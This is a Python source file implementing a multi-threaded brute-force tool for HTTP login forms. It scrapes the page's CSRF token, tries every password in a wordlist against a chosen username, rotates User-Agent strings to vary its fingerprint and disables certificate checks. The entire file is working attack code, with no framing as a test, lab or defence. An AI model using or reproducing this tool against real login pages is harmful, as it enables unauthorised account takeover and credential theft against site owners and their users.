import random
import requests
from pathlib import Path
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

class BruteForceEngine:
    """Professional Multi-threaded Brute Forcer with CSRF/Session Support"""
    def __init__(self, colors=None):
        self.stop_flag = False
        self.session = requests.Session()
        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
        ]
        self.colors = colors or {
            "accent_blue": "#0000FF"
        }

    def _get_csrf(self, url):
        try:
            r = self.session.get(url, timeout=5, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            for tag in soup.find_all('input'):
                if 'csrf' in tag.get('name', '').lower() or 'token' in tag.get('name', '').lower():
                    return tag.get('name'), tag.get('value')
        except: pass
        return None, None

    def brute_http_form(self, url, user_field, pass_field, user, wordlist, failure_msg="Login failed", callback=None, threads=10):
        self.stop_flag = False
        if not Path(wordlist).exists(): return None
        
        csrf_name, csrf_val = self._get_csrf(url)
        if csrf_name and callback: callback(f"Detected CSRF Token: {csrf_name}")

        def _attempt(passwd):
            if self.stop_flag: return None
            try:
                passwd = passwd.strip()
                data = {user_field: user, pass_field: passwd}
                if csrf_name: data[csrf_name] = csrf_val
                
                headers = {"User-Agent": random.choice(self.ua_list)}
                r = self.session.post(url, data=data, headers=headers, timeout=5, verify=False)
                
                if failure_msg not in r.text and r.status_code != 401:
                    self.stop_flag = True
                    return passwd
            except: pass
            return None

        with open(wordlist, "r") as f: passwords = f.readlines()
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for res in executor.map(_attempt, passwords):
                if res:
                    if callback: callback(f"[SUCCESS] Credentials Found: {user}:{res}", self.colors.get("accent_blue"))
                    return res
        return None
